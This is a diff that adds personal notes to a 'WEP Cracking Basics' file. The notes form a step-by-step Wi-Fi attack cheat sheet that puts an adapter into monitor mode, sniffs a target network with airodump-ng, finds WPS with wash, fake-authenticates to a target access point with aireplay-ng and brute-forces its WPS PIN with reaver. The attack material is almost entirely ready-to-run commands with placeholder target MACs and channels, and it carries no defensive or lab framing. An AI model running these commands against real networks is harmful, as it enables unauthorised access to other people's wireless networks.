@@ -14,3 +14,54 @@ WEP Cracking Basics
 -Packet sniff and dump into a file. 
 airodump-ng --bssid <MAC Address of target> --channel <channel number of target> --write <filename> <interface ID YOU are using>
 
+
+Supported interfaces 
+
+iw list | grep -A 10 "Supported interface modes"
+
+Detect adapter 
+
+lsusb
+ip a
+
+Bring it down 
+
+sudo ip link set wlan0 down
+
+Enable monitor and avoid annoying issue of usb adapter not working 
+
+sudo iwconfig wlan0 mode monitor
+
+Bring up
+
+sudo ip link set wlan0 up
+
+Sniff
+
+sudo airodump-ng wlan0mon
+
+Or 
+
+sudo tcpdump -i wlan0mon
+
+If it still doesn't work 
+
+sudo airmon-ng check kill
+
+If it stops working after an update 
+
+sudo apt install realtek-rtl88xxau-dkms
+
+WPS enabled? 
+
+sudo wash --interface wlan0
+
+We now need to associate with the target network. 
+
+sudo aireplay-ng --fakeauth [# of seconds between each association attempt] -a [target MAC] -h [my wireless adapter MAC 1st 12 digits] wlan0 [my wireless adapter] 
+
+BEFORE YOU RUN CMD YOU MUST GET THE PIN USING REAVER
+
+sudo reaver --bssid [target MAC] --channel [CH of Target] --interface [my adpater IF] -vvv [This is to put it in verbose mode] --no-associate [this tells reaver not to associate. this is because the auto associate feature with reaver fails a lot]
+
+
